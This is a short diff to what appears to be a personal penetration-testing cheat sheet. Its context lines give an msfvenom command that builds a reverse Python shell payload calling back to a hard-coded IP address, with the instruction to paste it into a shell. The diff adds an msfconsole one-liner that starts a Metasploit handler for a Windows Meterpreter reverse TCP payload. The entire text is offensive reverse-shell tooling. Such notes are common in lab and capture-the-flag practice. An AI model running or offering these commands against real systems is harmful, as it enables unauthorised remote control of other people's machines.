@@ -44,3 +44,6 @@ dd
 # Get a proper shell from a half/broken shell
 `msfvenom -p cmd/unix/reverse_python lhost=69.201.13.55 lport=3344 R`
 paste in your shell, profit
+
+
+sudo msfconsole -x "use exploits/multi/handler; set lhost 10.10.14.14; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
